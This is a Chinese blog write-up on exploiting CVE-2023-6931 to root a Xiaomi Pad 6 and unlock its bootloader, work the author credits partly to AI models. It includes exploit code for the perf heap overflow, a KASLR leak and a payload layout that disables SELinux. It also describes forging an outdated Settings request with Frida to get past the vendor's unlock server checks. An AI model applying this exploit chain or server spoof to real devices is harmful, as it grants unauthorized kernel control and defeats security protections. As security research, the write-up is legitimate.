---
title: 2026 年对内核一窍不通的人是怎么从零打通本机 BootLoader 的
date: 2026-09-22 01:51:58
categories:
    - 实操记录
tags:
    - pwn
    - kernel
    - Android
    - Xiaomi
    - RealWorld
cover: https://yutori-natsu.github.io/images/HRsKQNDbQAAAPeX.jpg
---


本人在大三时入手了一台小米平板 6，原本计划有什么高大上的用法，后面也是做了上课时用 `RustDesk` RDP 回宿舍电脑划水以及平时打二游的划水机，在蔚蓝档案国服把主推的柚鸟夏喂到 100 羁绊后边堂堂退休，只在飞来飞去打比赛时放缓存的音乐听歌。在用的时候，发现了 [weeazn](https://space.bilibili.com/67368617) 的主题装饰项目，尝试安到这个平板上时又遇到了各种问题（主要原因是没有 root），当时一翻查找之后无果，这部分计划便也不了了之，于是它便在我的工位上放置了很久。


今年暑假，`DeepSeek v4` 发布，早已领略过新一代 LLM 在安全方面的威力后，我便也想看看 dsv4 的实际表现怎么样。此时正值 `GhostLock`（`CVE-2026-43499`）公开发布，于是我就驾驶 `v4 flash/pro preview`, `v4f-0731` 挖平板内核的漏洞，并找到一个能利用的 nday 构建了可以部分提权的 PoC。不过受限于基模能力，v4f 并没有成功关闭 `SELinux`，对应的提权也只是 `uid=0`，其所属的域（貌似是一个 `SELinux` 相关的概念）在一番探测后选择迁移到了当时能找到能力最多的 `mcd` 域。不久之后边上峰谷定价时期，直到 `v4.1f` 发布后，才趁着梁文谷时期看看能不能把这个 PoC 进一步完善。这次抽奖的运气还是很成功的，不然也就不会有这篇文章了（笑）。以下就结合着设备的状况和各种日志稍微浅浅理解一下这个跨度两个多月的项目，怎么从没有 root 的小米平板 6 （`xiaomi-pipa`）利用一个 nday 加上已知的社区项目解锁 BL 的。


首先，这个设备非常有意思。它 `uname -a` 的结果显示内核版本为 `4.19.157-perf-g240e1d0a5f52`，有一个 `shell` 可读的文件 `/proc/config.gz` 保存了 `kconfig`，在 `sys` 下还有 `/sys/fs/pstore/console-ramoops-0` 是 `shell` 可读的 `kernel console` 日志。对利用有益的内核设置我们后面谈到再说，现在就从选用的 nday 开始。


## CVE-2023-6931


这个漏洞在 `4.3` 引入，并在 `6.7` 修复，其成因是 Performance Events 系统组件中 `perf_event` 的 `read_size` 可能会溢出，进而导致在 `perf_read_group()` 中堆溢出。在 `xiaomi-pipa` 中，`shell` 可以直接调用这个子系统（其实 `kconfig` 中有 `CONFIG_SECURITY_PERF_EVENTS_RESTRICT=y`，但不知道为什么 `/proc/sys/kernel/perf_event_paranoid` 在运行时便是 `-1`，同时 `SELinux` 也没有对 `shell` 域限制该能力）。以下分析主要参考[这篇博客](https://u1f383.github.io/linux/2024/11/14/linux-kernel-perf-cve-2023-6931-analysis.html)书写。


首先，在 userspace 下可以通过 `perf_event_open` 系统调用去创建一个 `perf_event`。可用的参数包括：
- `flags` 为事件启用特定功能
- `pid` 和 `cpu` 指示应监控哪个进程和 CPU
- `group_fd` 允许创建事件组。首先将 `group_fd` 设置为 `-1` 创建事件组组长，随后可以通过将 `group_fd` 指定为组长的 `fd` 来将事件附加到该组。创建事件组后，它作为一个单一单元运行，这意味着所有组成员将一起被移动到不同的 CPU。该功能的函数原型和关键代码如下：


```c
SYSCALL_DEFINE5(perf_event_open,
        struct perf_event_attr __user *, attr_uptr,
        pid_t, pid, int, cpu, int, group_fd, unsigned long, flags)
{
    struct perf_event *event, *sibling;
    struct perf_event_context *ctx;
    struct task_struct *task = NULL;

    // [...]
    if (pid != -1 && !(flags & PERF_FLAG_PID_CGROUP)) {
        task = find_lively_task_by_vpid(pid); // [1]
    }

    // [...]
    event = perf_event_alloc(&attr, cpu, task, group_leader, NULL, // [2]
                 NULL, NULL, cgroup_fd);

    // [...]
    ctx = find_get_context(pmu, task, event); // [3]

    // [...]
    event_file = anon_inode_getfile("[perf_event]", &perf_fops, event,
                    f_flags);

    // [...]
    if (!perf_event_validate_size(event)) {
        err = -E2BIG;
        goto err_locked;
    }

    // [...]
    perf_install_in_context(ctx, event, event->cpu); // [4]
    fd_install(event_fd, event_file); // [5]
    return event_fd;
}
```


首先，它获取进程的 `task_struct` 对象 `[1]` 并分配一个 `perf_event` 对象 `[2]`。接下来，它找到对应的 `perf_event_context` 对象 `[3]`，将新的 perf 事件安装到上下文中 `[4]`，最后将事件文件添加到 `fd` 表中 `[5]`。其中 `perf_event_alloc` 函数实现如下：


```c
static struct perf_event *
perf_event_alloc(struct perf_event_attr *attr, int cpu,
         struct task_struct *task,
         struct perf_event *group_leader,
         struct perf_event *parent_event,
         perf_overflow_handler_t overflow_handler,
         void *context, int cgroup_fd)
{
    struct pmu *pmu;
    struct perf_event *event;

    // [...]
    event = kmem_cache_alloc_node(perf_event_cache, GFP_KERNEL | __GFP_ZERO,
                      node);
    
    if (!group_leader)
        group_leader = event; // [6]

    event->attr = *attr;
    event->group_leader = group_leader;
    pmu = perf_init_event(event);
    // [...]

    return event;
}
```


如果没有提供 `group_leader` ，新的 perf 事件本身将充当组领导者 `[6]`；否则，它将被添加为指定组领导者事件的同级事件。在先前的 `perf_event_open` 收尾时，会调用 `perf_install_in_context` 将 perf 事件安装到上下文，其调用链如下：


```c
static void
perf_install_in_context(struct perf_event_context *ctx,
            struct perf_event *event,
            int cpu)
{
    // [...]
    add_event_to_ctx(event, ctx);
}

static void add_event_to_ctx(struct perf_event *event,
                   struct perf_event_context *ctx)
{
    // [...]
    list_add_event(event, ctx);
    perf_group_attach(event);
}

static void
list_add_event(struct perf_event *event, struct perf_event_context *ctx)
{
    // [...]
    list_add_rcu(&event->event_entry, &ctx->event_list);
    // [...]
}

static void perf_group_attach(struct perf_event *event)
{
    struct perf_event *group_leader = event->group_leader;

    if (group_leader == event)
        return;

    // [...]
    list_add_tail(&event->sibling_list, &group_leader->sibling_list); // [7]
    group_leader->nr_siblings++;
    group_leader->group_generation++;

    perf_event__header_size(group_leader);

    for_each_sibling_event(pos, group_leader)
        perf_event__header_size(pos);
}
```


其中，`perf_group_attach()` 函数将新的 perf 事件添加到组的同级事件中 `[7]`。综上所述，假如我们创建了一个 perf 事件组，记其组长事件的 `struct perf_event` 为 `A`，后续在同事件组里添加了事件 `B` 和 `C`，则有如下结构：


```c
B -> group_leader = A;
B -> sibling_list = C;
C -> group_leader = A;
C -> sibling_list = B;
```


### 漏洞成因


事件组创建后我们能拿到一个 `event_fd`，这个 `fd` 可以交给 `read` 去读，其调用链如下：


```c
read(fd, buf, count)
  └─ perf_fops.read = perf_read()
       ├─ security_perf_event_read(event)
       └─ __perf_read(event, buf, count)
            ├─ if (count < event->read_size) return -ENOSPC;
            ├─ if (read_format & PERF_FORMAT_GROUP)
            │      perf_read_group(event, read_format, buf)
            │        values = kzalloc(event->read_size)
            │        __perf_read_group_add(leader, ...)
            │        copy_to_user(buf, values, event->read_size)
            └─ else
                   perf_read_one(event, read_format, buf)
```


该漏洞的核心成因是 `perf_event` 中成员 `read_size` 被定义为 `u16`，同时在 `perf_group_attach` 中缺少对 `read_size` 发生整形溢出的处理，因此导致 `perf_read_group` 时 `kzalloc` 分配了一个偏小的堆块，进而在 `__perf_read_group_add` 发生内核堆溢出。为了达成该条件，我们需要深入查看 `perf_group_attach` 的处理方式：


```c
static void perf_group_attach(struct perf_event *event)
{
    // [...]
    group_leader->nr_siblings++;
    perf_event__header_size(group_leader);
}

static void perf_event__header_size(struct perf_event *event)
{
    __perf_event_read_size(event, event->group_leader->nr_siblings);
    // [...]
}

static void __perf_event_read_size(struct perf_event *event, int nr_siblings)
{
    int entry = sizeof(u64); /* value */
    int size = 0;
    int nr = 1;
    
    if (event->attr.read_format & PERF_FORMAT_GROUP) {
        nr += nr_siblings;
        size += sizeof(u64);
    }

    size += entry * nr;
    event->read_size = size; // [6]
}
```


可以发现，此处的 `int size (=8+8*(nr+1))` 会被直接截断存入 `u16 read_size`。尽管在 `sys_perf_event_open` 时，内核调用了 `perf_event_validate_size` 去检查**单个**事件的大小是否合法`[1]`：


```c
SYSCALL_DEFINE5(perf_event_open,
        struct perf_event_attr __user *, attr_uptr,
        pid_t, pid, int, cpu, int, group_fd, unsigned long, flags)
{
    // [...]
    if (!perf_event_validate_size(event)) { // [1]
        err = -E2BIG;
        goto err_locked;
    }
    // [...]
}

static bool perf_event_validate_size(struct perf_event *event)
{
    __perf_event_read_size(event, event->group_leader->nr_siblings + 1);
    __perf_event_header_size(event, event->attr.sample_type & ~PERF_SAMPLE_READ);
    perf_event__id_header_size(event);

    if (event->read_size + event->header_size +
        event->id_header_size + sizeof(struct perf_event_header) >= 16*1024)
        return false;

    return true;
}

struct perf_event {
    // [...]
    u16                header_size;
    u16                id_header_size;
    u16                read_size;
    // [...]
};
```


可以发现，该函数仅验证新创建的事件，组的累计读取大小并未被验证，导致了后续可以构建操作溢出 `read_size`。溢出的原语来自 `__perf_read_group_add`，相关代码如下：


```c
static int perf_read_group(struct perf_event *event,
                   u64 read_format, char __user *buf)
{
    // [...]

    ret = __perf_read_group_add(leader, read_format, values); // [1]

    list_for_each_entry(child, &leader->child_list, child_list) { // [2]
        ret = __perf_read_group_add(child, read_format, values);
    }
    
    // [...]
}

static int __perf_read_group_add(struct perf_event *leader,
                    u64 read_format, u64 *values)
{
    int n = 1; /* skip @nr */
    // [...]
    values[n++] += perf_event_count(leader);
    // [...]
}

static inline u64 perf_event_count(struct perf_event *event)
{
    return local64_read(&event->count) + atomic64_read(&event->child_count);
}
```


在分配好较小的缓冲区后，`__perf_read_group_add` 会遍历组长事件 `[1]` 和后续的兄弟事件 `[2]`，当内核遍历事件兄弟节点时就会发生堆溢出加，最终组成我们的堆溢出利用原语。


### 利用实现


在实际利用中，exp 与博客的选择相同，将 `values` 分配到 `kmalloc-2048`，溢出修改堆喷的 `struct netlink_sock` 结构体劫持后续控制流。相关的准备如下：


```c
/* ---------- perf group setup ---------- */
static int setup_group(void)
{
    struct perf_event_attr pe; memset(&pe, 0, sizeof(pe));
    pe.type = PERF_TYPE_SOFTWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_SW_TASK_CLOCK;
    pe.disabled = 0;
    pe.exclude_hv = 1;
    pe.read_format = PERF_FORMAT_GROUP;
    sib_fds[0] = perf_event_open(&pe, getpid(), -1, -1, 0);
    
    memset(&pe, 0, sizeof(pe));
    pe.type = PERF_TYPE_SOFTWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_SW_PAGE_FAULTS;
    pe.disabled = 1;
    pe.exclude_hv = 1;
    pe.read_format = 0;
    for (int i = 1; i <= sib_count; i++) {
        sib_fds[i] = perf_event_open(&pe, getpid(), -1, sib_fds[0], 0);
    }
}
```


首先，创建一个 `PERF_TYPE_SOFTWARE` 的 `TASK_CLOCK` 事件组组长，然后给它添加 `8446` 个 `PAGE_FAULTS` 兄弟事件（`8+8*(8446+1) mod 65536 = 2048`）。选用 `PERF_TYPE_SOFTWARE` 的原因包括它在 `QEMU` 中表现与真机一致、以及其规模不受限于硬件规格，只需要提高内存限制。接下来事件组组长记录 `TASK_CLOCK`，由于内核在处理事件组组长时还不会发生溢出，此处就随便选择了一个永远可用、一直计数的 per-task 软件事件；兄弟事件选择 `PAGE_FAULTS` 则是因为只有这个事件类型是能够在用户态精确操作的事件，其实现如下：


```c
static int setup_group(void)
{
    // [...]
    ioctl(sib_fds[target_sib], PERF_EVENT_IOC_RESET, 0); [1]
    inc_counters(sib_fds[target_sib], target_delta);
    // [...]
}

static void inc_counters(int fd, long inc)
{
    long pg = sysconf(_SC_PAGESIZE);

    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);

    char *m = mmap(NULL, (size_t)inc * pg, PROT_READ | PROT_WRITE,
                    MAP_ANON | MAP_PRIVATE, -1, 0);
    for (long i = 0; i < inc; i++) [2]
        m[i * pg] = 1;
    munmap(m, (size_t)inc * pg);

    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
}
```


对于我们需要操作的偏移 `target_sib`，首先通过 `PERF_EVENT_IOC_RESET` 将对应的 perf 事件清零，然后通过制造指定次数的缺页异常控制 `event->count`，最后在溢出时将 `netlink_sock->sk_data_ready` 改写成我们需要的内容。具体的实现略有不同，可以参考文末公开的仓库。


## 控制流劫持后利用


在 exp 中，我们的堆溢出最后将 `netlink_sock->sk_data_ready` 从 `sock_def_readable` 增加到 `netlink_sock_destruct_work`，最后能产生如下调用链：


```c
sendto(fd, buff, len, flags, addr, addr_len)
  └─ __sys_sendto() → sock_sendmsg() → netlink_sendmsg()
       └─ netlink_unicast()
            └─ netlink_unicast_kernel() → rtnetlink_rcv() → rtnl_getlink()
                 └─ netlink_ack()
                      └─ netlink_unicast(rtnl, ack, victim_portid)
                           └─ netlink_attachskb() → netlink_sendskb()
                                └─ skb_queue_tail(&victim->sk_receive_queue, skb)
                                     └─ victim->sk_data_ready(victim)
                                          └─ netlink_sock_destruct_work(victim)
```


其中，`netlink_sock_destruct_work` 会产生如下调用：


```c
static void netlink_sock_destruct_work(struct work_struct *work)
{
    struct netlink_sock *nlk = container_of(work, struct netlink_sock,
                        work);

    sk_free(&nlk->sk);
}
```


其中，`container_of` 是 `include/linux/kernel.h` 里的宏，在 `pipa` 上展开如下：


```armasm
ffffff8009322c90 <netlink_sock_destruct_work>:
ffffff8009322c90:  a9bf7bfd   stp  x29, x30, [sp, #-16]!
ffffff8009322c94:  910003fd   mov  x29, sp
ffffff8009322c98:  d1110000   sub  x0, x0, #0x440             ; ← container_of 展开
ffffff8009322c9c:  97fde5db   bl   ffffffff800929c408 <sk_free>
ffffff8009322ca0:  a8c17bfd   ldp  x29, x30, [sp], #16
ffffff8009322ca4:  d65f03c0   ret
ffffff8009322ca8 <netlink_realloc_groups>
; ...
```


也就是说，`netlink_sock_destruct_work(victim)` 会进一步调用 `sk_free(victim - 0x440)`。如果我们能控制这一片内存，我们就能够做一次 `sk_free(payload)`，进而利用 `sk_free` 去做文章。这一步并不存在根本性的困难，`perf_read_group()` 在结尾会执行 `kfree(values)`，也就是说我们只需要在越界写之后把进行越界的 `values` 从 `kmalloc` 的 `freelist` 里取回就行了，exp 中选择用 `sendto()` 去紧接着将 `values` 从 `kmalloc-2048` 中取出，并将 `payload` 放到 `victim - 0x440` 的位置（需要 `values` 越界写下一个紧跟着的 `netlink_sock`），这样就完成了后利用前的准备。在 `sk_free(payload)` 中，我们需要的关键代码路径如下：


```c
void sk_free(struct sock *sk)
{
    __sk_free(sk);
}

static void __sk_free(struct sock *sk)
{
    // [...]
    sk_destruct(sk);
}

void sk_destruct(struct sock *sk)
{
    // [...]
    __sk_destruct(&sk->sk_rcu);
}

static void __sk_destruct(struct rcu_head *head)
{
    struct sock *sk = container_of(head, struct sock, sk_rcu);
    struct sk_filter *filter;

    if (sk->sk_destruct)
        sk->sk_destruct(sk); // [1]

    // [...]

    if (sk->sk_peer_cred)
        put_cred(sk->sk_peer_cred); // [2]

    // [...]

    sk_prot_free(sk->sk_prot_creator, sk); // [3]
}
```


其中，`put_cred` 在 `include/linux/cred.h` 定义如下：


```c
// include/linux/cred.h
static inline void put_cred(const struct cred *_cred)
{
    struct cred *cred = (struct cred *) _cred;

    validate_creds(cred);
    if (atomic_dec_and_test(&(cred)->usage))
        __put_cred(cred);
}

#ifdef CONFIG_DEBUG_CREDENTIALS
// [...]
#define validate_creds(cred)                \
do {                            \
    __validate_creds((cred), __FILE__, __LINE__);    \
} while(0)

#else
// [...]
static inline void validate_creds(const struct cred *cred)
{
}
#endif
```


由于在 `pipa` 上，没有开启 `CONFIG_DEBUG_CREDENTIALS` 编译选项，此处的 `validate_creds` 会被声明为空函数，`put_cred` 会直接执行 `atomic_dec_and_test`，也就是先将 `&(cred)->usage)` 这块地址上的内容减 1，然后判断结果是否等于 0。


这部分后利用的实现，是分别将 `payload` 中的 `sk->sk_destruct` 改为 `commit_creds`（`[1]`），以及将 `sk->sk_peer_cred` 改为 `&selinux_state`（`[2]`），此时相当于执行 `commit_creds(&sk)` 和 `*(int_32*)&selinux_state -= 1`，恰好能够提权 `root` 并关闭 `SELinux`，不过这需要对 `payload` 进行进一步的设计，使其成为 `struct sock` 和 `struct cred` 的 polyglot。具体来说，在 `pipa` 上有如下约束：


| 偏移 | sock | cred |
|---|---|---|
| +0x00 | — | `usage = 1`（`BUG_ON(usage<1)`） |
| +0x04 | — | `uid = 0` |
| +0x08 | — | `gid = 0` |
| +0x0c | — | `suid = 0` |
| **+0x10** | `((u32) >> 30) & 1 == 0` （`sk_net_refcnt`） | `sgid = 0` |
| +0x14 | — | `euid = 0` |
| +0x18 | — | `egid = 0` |
| +0x1c | — | `fsuid = 0` |
| +0x20 | — | `fsgid = 0` |
| +0x24 | — | `securebits = 0` |
| +0x28 | — | `cap_inheritable = ~0` |
| +0x30 | — | `cap_permitted = ~0` |
| +0x38 | — | `cap_effective = ~0` |
| +0x40 | — | `cap_bset = ~0` |
| +0x48 | — | `cap_ambient = ~0` |
| +0x50 | — | `jit_keyring = 0` |
| +0x58 | — | `session_keyring = 0` |
| **+0x60** | `((u64) >> 24) & 1 == 0`（`SOCK_RCU_FREE`） | `process_keyring = 0` |
| +0x68 | — | `thread_keyring = 0` |
| +0x70 | — | `request_key_auth = 0` |
| +0x78 | — | `security = &payload+0x200`（伪造 `tsec`） |
| +0x80 | — | `user = &root_user` |
| +0x88 | — | `user_ns = &init_user_ns` |
| +0x90 | — | `group_info = &init_groups` |
| +0x108 | `sk_filter = 0` | — |
| +0x144 | `sk_wmem_alloc = 1` | — |
| +0x1D0 | `sk_frag.page = 0` | — |
| +0x200-0x217 | — | 伪造的 `tsec` |
| +0x218 | `sk_prot_creator = &netlink_proto` | — |
| +0x240 | `sk_peer_pid = 0` | — |
| +0x248 | `sk_peer_cred == 0 \|\| sk_peer_cred == &selinux_state` | — |
| +0x280 | `sk_security = &payload+0x2a0` | — |
| +0x288 | `sk_cgrp_data = 2` | — |
| +0x290 | `sk_memcg = 0` | — |
| +0x2C0 | `sk_destruct = &commit_creds` | — |
| +0x2C8 | `sk_reuseport_cb` = 0 | — |


巧妙的是，这个 polyglot 约束在两个 `struct` 重叠的部分都可以通过全部置 0 解决。同时，`selinux_state` 的定义如下：


```c
// security/selinux/include/security.h
struct selinux_state {
    bool disabled;
#ifdef CONFIG_SECURITY_SELINUX_DEVELOP
    bool enforcing;
#endif
    bool checkreqprot;
    bool initialized;
    bool policycap[__POLICYDB_CAPABILITY_MAX];
    struct selinux_avc *avc;
    struct selinux_ss *ss;
};
```


在设备启动时，有 `initialized = 1` 和 `enforcing = 1`，此时 `(int_32)selinux_state = 0x01000100`，在 `atomic_dec_and_test` 后变成 `0x010000FF`，即 `enforcing = 0` 和 `disabled = 0xff`，便能成功关闭 `SELinux`。


至此，我们已经成功拿到了 `root` 权限并关闭了 `SELinux`，最后需要做的一步就是让结尾的 `sk_prot_free` 不要崩溃，这部分结合前面 `payload` 的约束简单说明其如何安全结束，参考相关代码：


```c
static void sk_prot_free(struct proto *prot, struct sock *sk) // sk_prot_creator = &netlink_proto
{
    struct kmem_cache *slab;
    struct module *owner;

    owner = prot->owner;
    slab = prot->slab;

    cgroup_sk_free(&sk->sk_cgrp_data);
    mem_cgroup_sk_free(sk);
    security_sk_free(sk);
    if (slab != NULL) // netlink_proto.slab = 0 (设备本身会执行 proto_register(&netlink_proto, 0))
        kmem_cache_free(slab, sk);
    else
        kfree(sk);
    module_put(owner); // netlink_proto.owner = 0
}

// kernel/cgroup/cgroup.c
void cgroup_sk_free(struct sock_cgroup_data *skcd)
{
    if (skcd->no_refcnt)
        return;
    // [...]
}

// include/linux/cgroup-defs.h
struct sock_cgroup_data {
    union {
        struct {
            u8  is_data : 1;
            u8  no_refcnt : 1; // sk_cgrp_data = 2
            u8  unused : 6;
            u8  padding;
            u16 prioidx;
            u32 classid;
        } __packed;
        // [...]
        u64     val;
    }
};

// mm/memcontrol.c
void mem_cgroup_sk_free(struct sock *sk) {
    if (sk->sk_memcg) // sk_memcg = 0
        css_put(&sk->sk_memcg->css);
}

// security/security.c
void security_sk_free(struct sock *sk)
{
    call_void_hook(sk_free_security, sk);
}

#define call_void_hook(FUNC, ...) \
    do { \
        struct security_hook_list *P; \
 \
        hlist_for_each_entry(P, &security_hook_heads.FUNC, list) \
            P->hook.FUNC(__VA_ARGS__); \
    } while (0)

// security/selinux/hooks.c
LSM_HOOK_INIT(sk_free_security, selinux_sk_free_security),

static void selinux_sk_free_security(struct sock *sk)
{
    struct sk_security_struct *sksec = sk->sk_security; // sk_security = &payload+0x2a0

    sk->sk_security = NULL;
    selinux_netlbl_sk_security_free(sksec);
    kfree(sksec);
}

// security/selinux/netlabel.c
void selinux_netlbl_sk_security_free(struct sk_security_struct *sksec)
{
    if (sksec->nlbl_secattr != NULL) // nlbl_secattr = &payload+0x2a0 + 8 = 0
        netlbl_secattr_free(sksec->nlbl_secattr);
}

// security/selinux/include/objsec.h
struct sk_security_struct {
    enum {
        // [...]
    } nlbl_state;
    struct netlbl_lsm_secattr *nlbl_secattr;
    // [...]
};

// kernel/module.c
void module_put(struct module *module)
{
    int ret;

    if (module) { // netlink_proto.owner = 0
        // [...]
    }
}
```


至此，构造的 `payload` 就能够避免 `sk_prot_free` 中在各种 `free` 操作里崩溃，也就能从上面的后利用链中带着 `euid=0` 和 `enforcing=0` 一路返回到 exp 的主进程中。不过，由于此时这片 `kmalloc-2048` 的内存破坏实在有点严重，这个 root 会话并不能存活多久，要持久化我们就必须想办法解锁 BL。


## 提权 root 的后利用

拿到 root 之后，解锁 BL 主要参考了 [MlgmXyysd/Xiaomi-HyperOS-BootLoader-Bypass](https://github.com/MlgmXyysd/Xiaomi-HyperOS-BootLoader-Bypass)、[TheAirBlow/HyperSploit](https://github.com/TheAirBlow/HyperSploit) 和 [ednoct/MicomDetour](https://github.com/ednoct/MicomDetour) 三个方案。但在这个设备上这三个方案都用不了，其原因是三者都依赖旧版设置在绑定账号时，会在 `logcat` 中写入用固定 `key/iv` 加密的请求，以上方案都在读取并解密相关 `payload` 后断开网络、修改 `payload` 并接管与服务器的交互。在新版的设置中，被写入 `logcat` 的这部分内容不再由固定密钥加密，而是运行时随机生成，同时再将该随机秘钥用小米服务器签发的一个 RSA-2048 公钥加密，彻底打断了直接解出明文的途径。同时，新版 `HyperOS 2` 禁止降级安装设置，之前已知的降级覆盖安装然后继续旧方案的方法也不可行。

最终的解决方案在本人看来堪称天马行空：AI 反编译了旧版设置向服务器发送的请求包格式，然后在 root 时通过 frida 注入设置进程，调用设置应用内的各种方法，手动构造一个旧版设置的请求并发送给服务器。对数据包具体的修改，包括将 `rom_version` 从当前设备的 `OS2.0.20.0.UMZCNXM` 直接改成 `V14.0.20.0.UMZCNXM`，以及删除 `cloudsp_romVersion` 字段两项操作。完成以上操作后，利用进程成功收到了服务器的 `"code":0` 响应，后续用 MiUnlockTool 查看也能成功得到 `20036 Please unlock 168 hours later…` 的回显，证明我们成功绕过了新版 `HyperOS` 的防护机制，解锁了这台设备的 BL。

## 杂谈

### 你也能 QEMU？

前面稍微提了一嘴构建一个 QEMU 环境，这部分工作也是我扔给 AI 一个线刷包后让它自己捣鼓出来的。总的来说 AI 对线刷包里的 `boot.img` 做了这样的 patch：将文件偏移 `0x6312B8`（VA `0xffffff80086b12b8`，符号 `is_scm_armv8`）处的指令从 `stp x29,x30,#-32 ; str x19` 修改成了 `mov x0,#0; ret`。这样做的原因是 QEMU 上没有 QCOM secure monitor，这部分的判断不 patch 会导致在 `is_scm_armv8` 中执行 QCOM 的私有指令 `smc #0` 时报错，进而调用 `el1_undef` 处理未定义指令，在这里给 `swapper`进程（`pid0`）发送 `SIGILL`，进而走到 `__sigqueue_alloc` 调用 `kmem_cache_alloc(sigqueue_cachep, ...)`。由于此时内核还在 `setup_arch` 里，`signals_init` 未执行，此时的 `sigqueue_cachep` 还是 `NULL`，这导致 `kmem_cache_alloc` 尝试解引用一个非法的 cache 指针，让内核进入 `el1_da` 并调用 `do_mem_abort` 处理这个访存错误，这一部分最终会执行到 `__do_kernel_fault` 然后打印 `Unable to handle kernel read from unreadable memory at virtual address 0000000000000018` 和相关的 log，最后走到 `oops_end(flags, regs, SIGSEGV)`。讲道理此时内核应该能够成功 panic，但 `pipa` 的 `kconfig` 里设置是 `CONFIG_PANIC_ON_OOPS is not set`，这导致了 `oops_end` 执行 `do_exit(SIGSEGV)`，导致内核尝试杀掉 `pid0`，触发了 `Attempted to kill the idle task!` 这个 panic，紧接着调用 `panic()`，然后 dump 相关 log，最后继续 `oops_end` 导致无限递归 panic，最终耗尽内核栈，执行到 `__bad_stack` 然后卡在 `handle_bad_stack`，在这里调用 `nmi_panic` 去（设计上）预防 recusive overflows。但是考虑此处的上下文，在 `setup_arch` 还没有结束时，内核还是在纯 CPU0 上跑的，因此这个时候内核的全局变量 `panic_cpu` 就已经是 CPU0 了，导致内核走到 `nmi_panic_self_stop` 的分支并返回到 `handle_bad_stack`，执行结尾的循环将 CPU0 停住，最终就导致了整个 QEMU 卡住：

```armasm
<handle_bad_stack+0x118>:
ffffff80080925a0:  wfe
ffffff80080925a4:  wfi
ffffff80080925a8:  b    ffffff80080925a0
```

在 patch 了这个函数之后，is_scm_armv8 能让 `__scm_call2` 返回 `-ENODEV`，避免调用相关的私有指令，最后让内核成功启动。后续的调试过程由于 `pipa` 内核串口是高通的 `GENI SE`，而 QEMU 的 `-M virt` 给的是 `PL011` 串口，在内核里没有对应的驱动支持，添加 `qcom,qupv3-geni-se` 的 `dtb` 只能提供相应串口的定义，内核仍然无法与串口交互。因此，QEMU 没法直接读到内核的输出，最后的解决方案是通过 gdb 读 `log_buf` 的内容以及其它地址来观察输出。

### KASLR leak

前文的讨论刻意留下了 KASLR leak 没有解释，而这步是构建回收 `values` 的 `payload` 内容锁必须的。实际利用中采用创建 perf 事件定期采集程序空转时内核的实际 IP（由于 `/proc/sys/kernel/perf_event_paranoid = -1`，这个监测能采样到内核里的地址），然后将它与从线刷包的 `boot.img` 中提取的 `kallsyms` 比较评估，从大量的内核函数地址中计算真实的 `kbase`。关键代码如下：

```c
static int leak_kshift(void)
{
    struct perf_event_attr pe; memset(&pe, 0, sizeof(pe));
    pe.type = PERF_TYPE_SOFTWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_SW_CPU_CLOCK;
    pe.sample_period = 64;
    pe.sample_type = PERF_SAMPLE_IP; // 每 64ns（在设备上被限制到 100kHz）采样一次内核 IP
    pe.disabled = 1;
    pe.exclude_hv = 1;
    int fd = perf_event_open(&pe, 0, -1, -1, 0);

    size_t pg = sysconf(_SC_PAGESIZE);
    void *ring = mmap(NULL, pg * 9, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    
    struct perf_event_mmap_page *meta = ring;
    unsigned long long samples[256]; int ns = 0;
    for (int rnd = 0; rnd < 3 && ns < 12; rnd++) {
        ioctl(fd, PERF_EVENT_IOC_RESET, 0);
        ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
        for (volatile int i = 0; i < 8000000; i++); // 空转让 perf 事件采样内核地址
        ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
        
        // 遍历 ring 并解析其中的内核地址
        // [...]
            if ((ip >> 56) == 0xff) samples[ns++] = ip;
    }

#define KBASE_LINK       0xffffff8008000000ULL

    // 对所有的采样结果做评估
    for (unsigned long long sh = 0x200000; sh < 0x8000000000ULL; sh += 0x200000) {
        // score(sh) = 0
        for (int i = 0; i < ns; i++) {
            if (samples[i] - sh < KBASE_LINK) continue;
            unsigned long long off = samples[i] - sh - KBASE_LINK;
            if (off >= 0x40000000ULL) continue;
            if ( /* off 没有落在某个 .text 体内 */ ) continue;
            if ( /* off 落在 .rodata 上 */ ) continue;
            // score(sh) += 1
        }        
    }

    // 最后选择 score 最高的偏移中，能够让最小的 off 落在前 2MB 的最小偏移
    // 动机为泄漏循环本身跑的是 syscall/中断入口代码，这些固定在 .text 最前面，所以真实偏移必然把至少一个样本映射到镜像的前 2MB 地址内
}
```

相关的 exp 已经公开到了[这个仓库](https://github.com/Yutori-Natsu/cve-2023-6931-pipa)，一整个使山越堆越高这块


